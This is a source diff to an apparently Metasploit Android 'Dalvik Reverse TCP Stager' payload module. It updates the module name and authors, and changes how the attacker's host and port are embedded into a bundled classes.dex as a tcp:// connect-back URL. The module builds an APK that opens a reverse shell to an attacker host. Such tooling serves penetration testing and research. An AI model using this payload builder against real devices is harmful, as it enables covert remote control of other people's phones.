@@ -8,7 +8,7 @@ require 'msf/core/handler/reverse_tcp'
 require 'msf/base/sessions/command_shell'
 require 'msf/base/sessions/command_shell_options'
 
-module Metasploit3
+module Metasploit4
 
   CachedSize = :dynamic
 
@@ -17,14 +17,14 @@ module Metasploit3
 
   def initialize(info = {})
     super(merge_info(info,
-      'Name'			=> 'Dalvik Reverse TCP Stager',
-      'Description'	=> 'Connect back stager',
-      'Author'		=> 'timwr',
-      'License'		=> MSF_LICENSE,
-      'Platform'		=> 'android',
-      'Arch'			=> ARCH_DALVIK,
-      'Handler'		=> Msf::Handler::ReverseTcp,
-      'Stager'		=> {'Payload' => ""}
+      'Name'        => 'Dalvik Reverse TCP Stager',
+      'Description' => 'Connect back stager',
+      'Author'      => ['timwr', 'OJ Reeves'],
+      'License'     => MSF_LICENSE,
+      'Platform'    => 'android',
+      'Arch'        => ARCH_DALVIK,
+      'Handler'     => Msf::Handler::ReverseTcp,
+      'Stager'      => {'Payload' => ''}
     ))
   end
 
@@ -37,8 +37,8 @@ module Metasploit3
 
     classes = MetasploitPayloads.read('android', 'apk', 'classes.dex')
 
-    string_sub(classes, 'XXXX127.0.0.1                       ', "XXXX" + datastore['LHOST'].to_s) if datastore['LHOST']
-    string_sub(classes, 'YYYY4444                            ', "YYYY" + datastore['LPORT'].to_s) if datastore['LPORT']
+    url = "tcp://#{datastore['LHOST']}:#{datastore['LPORT']}"
+    string_sub(classes, 'ZZZZ' + ' ' * 512, 'ZZZZ' + url)
     apply_options(classes)
 
     jar.add_file("classes.dex", fix_dex_header(classes))
